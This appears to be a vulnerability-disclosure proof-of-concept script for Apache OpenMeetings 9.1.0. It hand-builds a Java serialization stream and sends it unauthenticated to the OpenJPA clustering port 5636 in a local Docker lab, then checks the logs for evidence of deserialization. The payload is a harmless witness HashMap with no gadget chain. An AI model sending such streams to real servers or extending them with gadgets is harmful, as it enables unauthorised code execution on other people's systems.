#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: openmeetings-cluster-openjpa (High: 8.1)
#  Vendor: Apache OpenMeetings (ASF)
#  Versions: OpenMeetings 9.1.0
#  Impact: Docs-on clustering TCP 5636 is unfiltered readObject
#  Requires: RemoteCommitProvider tcp, loopback 127.0.0.1:18162
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "openmeetings-cluster-openjpa"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Witness-only lab: OpenMeetings 9.1.0 OpenJPA TCP RemoteCommitProvider readObject.

Phase A: stock image, RemoteCommitProvider off, TCP 5636 closed.
Phase B: Clustering.xml leftover (uncomment tcp provider, default startup.sh
has no OpenJPA lists). Send java.util.HashMap / String only. No gadgets.
"""


import argparse
import os
import socket
import struct
import subprocess
import sys
import time

WITNESS = "OPENMEETINGS-CLUSTER-OPENJPA-WITNESS"
LABEL = "OPENMEETINGS-CLUSTER-OPENJPA-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "om-g11-cluster")
OM_SERVICE = os.environ.get("OM_SERVICE", "om")
HERE = os.path.dirname(os.path.abspath(__file__))
OM_HTTPS = os.environ.get("OM_HTTPS", "https://127.0.0.1:18161")
OM_JPA_HOST = os.environ.get("OM_JPA_HOST", "127.0.0.1")
OM_JPA_PORT = int(os.environ.get("OM_JPA_PORT", "18162"))
READY_TIMEOUT = int(os.environ.get("OM_READY_TIMEOUT", "600"))
PROTOCOL_VERSION = 0x1428ACFF
HASHMAP_SUID = 362498820763181265
BYTE_ARRAY_SUID = 0xACF317F8060854E0


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL {LABEL} {reason}")
    raise SystemExit(1)


def success(detail: str) -> None:
    log(f"IOC success-detail {detail}")
    log(f"SUCCESS {LABEL}")
    raise SystemExit(0)


def compose(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def compose_out(*args: str, timeout: int = 120) -> str:
    proc = compose(*args, timeout=timeout)
    return (proc.stdout or "") + (proc.stderr or "")


def om_exec(script: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return compose("exec", "-T", OM_SERVICE, "bash", "-lc", script, timeout=timeout)


def utf(s: str) -> bytes:
    raw = s.encode("utf-8")
    return struct.pack(">H", len(raw)) + raw


def java_string(s: str) -> bytes:
    return bytes([0x74]) + utf(s)


def java_hashmap_one(key: str, value: str) -> bytes:
    """java.util.HashMap with one String->String entry (no other classes)."""
    buf = bytearray()
    buf.append(0x73)  # TC_OBJECT
    buf.append(0x72)  # TC_CLASSDESC
    buf += utf("java.util.HashMap")
    buf += struct.pack(">q", HASHMAP_SUID)
    buf.append(0x03)  # SC_SERIALIZABLE | SC_WRITE_METHOD
    buf += struct.pack(">H", 2)
    buf.append(ord("F"))
    buf += utf("loadFactor")
    buf.append(ord("I"))
    buf += utf("threshold")
    buf.append(0x78)  # class annotation
    buf.append(0x70)  # super = null
    buf += struct.pack(">f", 0.75)
    buf += struct.pack(">i", 12)
    buf += bytes([0x77, 8])  # writeObject extras: capacity, size
    buf += struct.pack(">i", 16)
    buf += struct.pack(">i", 1)
    buf += java_string(key)
    buf += java_string(value)
    buf.append(0x78)  # TC_ENDBLOCKDATA
    return bytes(buf)


def java_byte_array(data: bytes) -> bytes:
    buf = bytearray()
    buf.append(0x75)  # TC_ARRAY
    buf.append(0x72)  # TC_CLASSDESC
    buf += utf("[B")
    buf += struct.pack(">Q", BYTE_ARRAY_SUID)
    buf.append(0x02)  # SC_SERIALIZABLE
    buf += struct.pack(">H", 0)
    buf.append(0x78)
    buf.append(0x70)
    buf += struct.pack(">i", len(data))
    buf += data
    return bytes(buf)


def openjpa_tcp_payload() -> bytes:
    """ObjectOutputStream matching TCPRemoteCommitProvider.broadcast then HashMap.

    handle() reads: readLong version, readLong id, readInt port, readObject
    sender address, readObject RemoteCommitEvent. Second readObject is a
    HashMap so the OM JVM must call ObjectInputStream.readObject.
    """
    buf = bytearray()
    buf += b"\xac\xed\x00\x05"
    buf += bytes([0x77, 20])
    buf += struct.pack(">q", PROTOCOL_VERSION)
    buf += struct.pack(">q", 0x4C414257)
    buf += struct.pack(">i", 5636)
    buf += java_byte_array(bytes([127, 0, 0, 1]))
    buf += java_hashmap_one("witness", WITNESS)
    return bytes(buf)


def hashmap_only_payload() -> bytes:
    return b"\xac\xed\x00\x05" + java_hashmap_one("witness", WITNESS)


def tcp_send(payload: bytes, timeout: float = 8.0) -> str:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((OM_JPA_HOST, OM_JPA_PORT))
        sock.sendall(payload)
        try:
            sock.shutdown(socket.SHUT_WR)
        except OSError:
            pass
        time.sleep(0.4)
        try:
            _ = sock.recv(64)
        except OSError:
            pass
        return "sent"
    except OSError as exc:
        return f"error:{type(exc).__name__}:{exc}"
    finally:
        sock.close()


def port_open(host: str, port: int, timeout: float = 2.0) -> bool:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        return sock.connect_ex((host, port)) == 0
    except OSError:
        return False
    finally:
        sock.close()


def inside_listen_5636() -> bool:
    proc = om_exec(
        "if timeout 1 bash -c 'echo >/dev/tcp/127.0.0.1/5636' 2>/dev/null; then echo OPEN; "
        "else echo CLOSED; fi"
    )
    out = ((proc.stdout or "") + (proc.stderr or "")).strip()
    log(f"IOC inside-5636 rc={proc.returncode} out={out[:200]}")
    if "OPEN" in out.splitlines()[-1:]:
        return True
    # /proc/net/tcp port 5636 = 0x1604
    proc2 = om_exec("grep -E ':1604 ' /proc/net/tcp /proc/net/tcp6 2>/dev/null || true")
    out2 = (proc2.stdout or "").strip()
    log(f"IOC proc-net-tcp-5636 {out2[:200] or 'empty'}")
    return bool(out2)


def wait_https(timeout: int) -> bool:
    deadline = time.time() + timeout
    n = 0
    while time.time() < deadline:
        n += 1
        logs = compose_out("logs", "--no-color", "--tail", "40", OM_SERVICE, timeout=30)
        if "Server startup in" in logs:
            log(f"IOC tomcat-started n={n}")
            return True
        if "SEVERE" in logs and "LifecycleException" in logs:
            log(f"IOC tomcat-severe n={n}")
        log(f"IOC tomcat-wait n={n}")
        time.sleep(5)
    return False


def java_cmdline() -> str:
    proc = om_exec(
        "pid=$(pgrep -n -f 'org.apache.catalina.startup.Bootstrap' || pgrep -n java || true); "
        "if [ -n \"$pid\" ] && [ -r /proc/$pid/cmdline ]; then "
        "tr '\\0' ' ' < /proc/$pid/cmdline; echo; "
        "else ps -ww -o args= -C java || true; fi",
        timeout=30,
    )
    return ((proc.stdout or "") + (proc.stderr or "")).strip()


def file_snip(path: str, pattern: str) -> str:
    proc = om_exec(f"grep -n -E {pattern!r} {path} 2>/dev/null || echo 'NO-MATCH {path}'")
    return ((proc.stdout or "") + (proc.stderr or "")).strip()[:800]


def om_logs(tail: int = 400) -> str:
    proc = compose("logs", "--no-color", "--tail", str(tail), OM_SERVICE, timeout=60)
    text = (proc.stdout or "") + (proc.stderr or "")
    inner = om_exec(
        "tail -n 200 /opt/openmeetings/logs/openmeetings.log "
        "/opt/openmeetings/logs/catalina.out /opt/openmeetings/logs/*.log 2>/dev/null || true",
        timeout=30,
    )
    return text + "\n" + ((inner.stdout or "") + (inner.stderr or ""))


def persistence_rcp() -> str:
    proc = om_exec(
        "grep -n RemoteCommitProvider "
        "/opt/openmeetings/webapps/openmeetings/WEB-INF/classes/META-INF/persistence.xml "
        "2>/dev/null || true"
    )
    return ((proc.stdout or "") + (proc.stderr or "")).strip()


def deserialize_hit(logs: str) -> str | None:
    needles = [
        "ClassCastException",
        "java.util.HashMap",
        "InvalidClassException",
        "ClassNotFoundException",
        "OptionalDataException",
        "tcp-receive-error",
        "Error receiving remote commit event",
        "RemoteCommitEvent",
        WITNESS,
    ]
    low = logs
    hits = [n for n in needles if n in low]
    if not hits:
        return None
    if any(
        x in logs
        for x in (
            "ClassCastException",
            "InvalidClassException",
            "ClassNotFoundException",
            "OptionalDataException",
            "tcp-receive-error",
            "Error receiving remote commit event",
        )
    ):
        return ",".join(hits)
    if "java.util.HashMap" in logs and "readObject" in logs:
        return ",".join(hits)
    return None


def phase_a() -> None:
    log("== phase A stock: RemoteCommitProvider off, 5636 closed ==")
    if not wait_https(READY_TIMEOUT):
        log("IOC phase-a https not ready, inspecting anyway")
    time.sleep(3)
    cmd = java_cmdline()
    log(f"IOC catalina-cmdline {cmd[:1200]}")
    if not cmd or "catalina" not in cmd.lower() and "java" not in cmd.lower():
        logs = om_logs(80)
        log(f"IOC phase-a-dead {logs[-800:]}")
        fail("stock catalina/java process not running")
    if "openjpa.RemoteCommitProvider" in cmd:
        fail("stock catalina JAVA_OPTS contains openjpa.RemoteCommitProvider")
    log("IOC stock-java-opts-no-RemoteCommitProvider yes")

    startup = file_snip("/opt/openmeetings/bin/startup.sh", "openjpa.serialization|RemoteCommitProvider|JAVA_OPTS")
    omsh = file_snip("/opt/om.sh", "openjpa.serialization|RemoteCommitProvider|JAVA_OPTS")
    unit = file_snip(
        "/opt/openmeetings/bin/openmeetings.service /opt/openmeetings/openmeetings.service "
        "/opt/openmeetings/*.service",
        "openjpa.serialization|JAVA_OPTS",
    )
    log(f"IOC startup.sh {startup[:500]}")
    log(f"IOC om.sh {omsh[:500]}")
    log(f"IOC systemd-unit {unit[:500]}")
    rcp = persistence_rcp()
    log(f"IOC persistence-RemoteCommitProvider {rcp[:400] or 'missing'}")
    if rcp and "<!--" not in rcp and "tcp(" in rcp:
        fail("stock persistence.xml already has RemoteCommitProvider uncommented")

    # Host 18162 is docker-proxy; only the in-container listen is OpenJPA.
    host_open = port_open(OM_JPA_HOST, OM_JPA_PORT)
    inside = inside_listen_5636()
    log(f"IOC phase-a host-5636-proxy={int(host_open)} inside-5636-open={int(inside)}")
    if inside:
        fail("stock 9.1.0 listens on OpenJPA TCP 5636")
    log("PHASE_A_STOCK_NOT_EXPLOITABLE 5636-closed no-RemoteCommitProvider")
    log(
        "IOC leftover-note docker om.sh may set OpenJPA lists; "
        "bin/startup.sh does not; clustering still off so 5636 is closed"
    )


def phase_b() -> None:
    log("== phase B docs-on leftover: RemoteCommitProvider=tcp, no startup.sh lists ==")
    if not wait_https(READY_TIMEOUT):
        log("IOC phase-b https not ready, waiting on 5636")
    deadline = time.time() + READY_TIMEOUT
    n = 0
    listening = False
    while time.time() < deadline:
        n += 1
        inside = inside_listen_5636()
        host_open = inside and port_open(OM_JPA_HOST, OM_JPA_PORT)
        log(f"IOC phase-b-wait n={n} host-5636={int(host_open)} inside-5636={int(inside)}")
        if inside:
            listening = True
            break
        time.sleep(5)
    if not listening:
        logs = om_logs(200)
        log(f"IOC phase-b-noport-logs {logs[-1500:]}")
        fail("5636 never listens even with docs RemoteCommitProvider=tcp")

    cmd = java_cmdline()
    log(f"IOC cluster-cmdline {cmd[:1200]}")
    if "openjpa.serialization.class.blacklist" in cmd:
        log("IOC note lists still on cmdline (docker om.sh); leftover still readObject")
    else:
        log("IOC cluster-java-opts-no-lists yes (matches default startup.sh)")
    rcp = persistence_rcp()
    log(f"IOC cluster-persistence {rcp[:400]}")
    if "tcp(" not in rcp or "<!--property name=\"openjpa.RemoteCommitProvider\"" in rcp:
        fail(f"cluster persistence did not uncomment RemoteCommitProvider {rcp[:200]}")

    before = om_logs(80)
    payload = openjpa_tcp_payload()
    if WITNESS.encode("ascii") not in payload:
        fail("payload missing witness string bytes")
    log(f"IOC payload-bytes n={len(payload)} witness-in-hashmap=1")
    result = tcp_send(payload)
    log(f"IOC tcp-send protocol+HashMap {result}")
    if result.startswith("error:"):
        alt = tcp_send(hashmap_only_payload())
        log(f"IOC tcp-send HashMap-only {alt}")
        if alt.startswith("error:"):
            fail(f"TCP 5636 send failed {result} {alt}")
    time.sleep(2)
    after = om_logs(400)
    delta = after
    if before and before in after:
        delta = after[len(before) :] if after.startswith(before) else after
    hit = deserialize_hit(after) or deserialize_hit(delta)
    log(f"IOC deserialize-hit {hit or 'none'}")
    if not hit:
        # one more HashMap-only attempt then re-check
        tcp_send(hashmap_only_payload())
        time.sleep(2)
        after = om_logs(400)
        hit = deserialize_hit(after)
        log(f"IOC deserialize-hit-retry {hit or 'none'}")
    snippet = after[-2000:].replace("\n", " | ")
    log(f"IOC log-tail {snippet}")
    if not hit:
        fail("no ObjectInputStream.readObject evidence in OM logs after HashMap write")
    log(f"IOC users n/a OpenJPA TCP unauth readObject hit={hit}")
    success(f"readObject hit={hit}")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--phase", choices=("a", "b"), required=True)
    args = parser.parse_args()
    if args.phase == "a":
        phase_a()
        return
    phase_b()


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        fail(f"exception {type(exc).__name__}: {exc}")

